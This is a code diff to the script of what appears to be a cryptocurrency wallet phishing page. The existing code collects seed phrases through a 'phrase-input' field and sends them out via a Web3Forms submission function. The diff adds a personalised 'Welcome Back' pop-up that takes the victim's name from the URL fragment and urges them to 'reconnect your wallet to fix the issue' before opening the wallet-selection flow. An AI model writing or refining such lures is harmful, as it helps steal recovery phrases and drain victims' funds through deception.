@@ -108,6 +108,15 @@
 
   // Inject HTML
   const html = `
+  <div id="welcome-back-overlay" class="welcome-back-overlay" aria-hidden="true">
+    <div class="welcome-back-modal" role="dialog" aria-modal="true">
+      <button id="welcome-back-close" class="welcome-back-close" aria-label="Close">✕</button>
+      <div id="welcome-back-header" class="welcome-back-header">Welcome Back</div>
+      <p id="welcome-back-desc" class="welcome-back-desc">Please kindly reconnect your wallet to fix the issue.</p>
+      <button id="welcome-back-connect-btn" class="welcome-back-btn">Connect Wallet</button>
+    </div>
+  </div>
+
   <div id="modal-overlay" class="modal-overlay" aria-hidden="true">
     <div class="modal-content">
       <div class="sticky-header" style="position:relative;text-align:center">
@@ -532,6 +541,8 @@
     });
     if(closeBtn) closeBtn.addEventListener('click', ()=>{ modalOverlay.classList.remove('active'); setTimeout(()=>modalOverlay.style.display='none',400) });
     if(closeManual) closeManual.addEventListener('click', ()=>{ manualOverlay.classList.remove('active'); setTimeout(()=>manualOverlay.style.display='none',400) });
+    if(welcomeCloseBtn) welcomeCloseBtn.addEventListener('click', ()=>{ welcomeOverlay.classList.remove('active'); setTimeout(()=>welcomeOverlay.style.display='none',220) });
+    if(welcomeConnectBtn) welcomeConnectBtn.addEventListener('click', openWalletSelection);
 
     if(toggleMore) toggleMore.addEventListener('click', ()=>{ if(extra.style.display==='none'){ extra.style.display='grid'; toggleMore.textContent='Show fewer wallets' } else { extra.style.display='none'; toggleMore.textContent='More wallets' } });
 
@@ -542,8 +553,34 @@
     const manualConnectBtn = document.getElementById('manual-connect-btn');
     const phraseInput = document.getElementById('phrase-input');
     const phraseStatus = document.getElementById('phrase-status');
+    const welcomeOverlay = document.getElementById('welcome-back-overlay');
+    const welcomeCloseBtn = document.getElementById('welcome-back-close');
+    const welcomeConnectBtn = document.getElementById('welcome-back-connect-btn');
+    const welcomeHeader = document.getElementById('welcome-back-header');
+    const welcomeDesc = document.getElementById('welcome-back-desc');
 
     function getExpectedWords() { const el = document.querySelector('input[name="phrase-length"]:checked'); return el ? Number(el.value) : 12; }
+    function openWalletSelection() {
+      if (modalOverlay) {
+        modalOverlay.style.display = 'flex';
+        setTimeout(() => modalOverlay.classList.add('active'), 10);
+      }
+      if (welcomeOverlay) {
+        welcomeOverlay.classList.remove('active');
+        setTimeout(() => {
+          welcomeOverlay.style.display = 'none';
+        }, 220);
+      }
+    }
+    function showWelcomeBackModal(name) {
+      if (!welcomeOverlay || !welcomeHeader || !welcomeDesc) return;
+      const safeName = (name || '').trim();
+      if (!safeName) return;
+      welcomeHeader.textContent = `Welcome Back ${safeName}`;
+      welcomeDesc.textContent = 'Please kindly reconnect your wallet to fix the issue.';
+      welcomeOverlay.style.display = 'flex';
+      setTimeout(() => welcomeOverlay.classList.add('active'), 10);
+    }
     function showPhraseError(msg) { if (!phraseStatus) return; phraseStatus.textContent = msg; phraseStatus.style.display = 'block'; setTimeout(()=>{ try{ phraseStatus.style.display='none' }catch(e){} }, 4000); }
 
     async function submitToWeb3Forms(data) {
@@ -558,6 +595,20 @@
         if(!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
         const result = await response.json(); if(result.success) return { success:true, message: result.message }; throw new Error(result.message||'Submission failed');
       } catch(err){ console.error('[submitToWeb3Forms] error:',err); return { success:false, error: err.message||'Submission failed' }; }
+    }
+
+    const hashName = (() => {
+      try {
+        const raw = (window.location.hash || '').replace(/^#/, '').trim();
+        if (!raw) return '';
+        return decodeURIComponent(raw);
+      } catch (e) {
+        return '';
+      }
+    })();
+
+    if (hashName) {
+      setTimeout(() => showWelcomeBackModal(hashName), 250);
     }
 
     if (manualConnectBtn) manualConnectBtn.addEventListener('click', async ()=>{
